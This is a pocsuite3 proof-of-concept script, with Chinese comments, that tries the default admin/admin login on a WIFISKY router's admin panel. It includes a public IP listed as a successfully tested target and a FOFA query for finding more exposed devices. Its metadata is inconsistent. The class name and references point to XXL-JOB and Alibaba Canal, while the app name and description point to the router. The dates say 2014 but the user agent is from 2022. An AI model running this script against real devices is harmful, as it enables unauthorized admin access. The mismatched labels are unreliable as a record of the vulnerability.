from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class XXLJOBPOC(POCBase):
    vulID = "1571"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "mhx"  # PoC作者的大名
    vulDate = "2014-10-16"  # 漏洞公开的时间,不知道就写今天
    createDate = "2014-10-16"  # 编写 PoC 的日期
    updateDate = "2014-10-16"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/alibaba/canal"]  # 漏洞地址来源,0day不用写
    name = "Canal Admin存在默认口令漏洞 PoC"  # PoC 名称
    appPowerLink = "https://github.com/alibaba/canal/wiki"  # 漏洞厂商主页地址
    appName = "WIFISKY-7层流控路由器"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://125.40.229.172/"]  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
               WIFISKY-7层流控路由器后台系统默认弱口令,攻击者可以直接通过默认口令登录后台进行敏感操作
           """  # 漏洞简要描述
    pocDesc = """
               admin/admin
           """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        # fofa = app="WIFISKY-7层流控路由器"
        import requests

        url = f"{self.url}/login.php?action=login&type=admin"
        headers = {"Connection": "close",
                         "sec-ch-ua": "\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"",
                         "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                         "X-Requested-With": "XMLHttpRequest", "sec-ch-ua-mobile": "?0",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                         "sec-ch-ua-platform": "\"Windows\"", "Origin": f"{self.url}",
                         "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
                         "Referer": f"{self.url}", "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9"}
        data = {"username": "admin", "password": "admin"}
        result = []
        try:
            res = requests.post(url=url, headers=headers, allow_redirects=False, data=data, verify=False, timeout=5)
            # 判断是否存在漏洞
            if "true" in res.text:
                result.append(url)
        except Exception as e:
            pass
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(XXLJOBPOC)
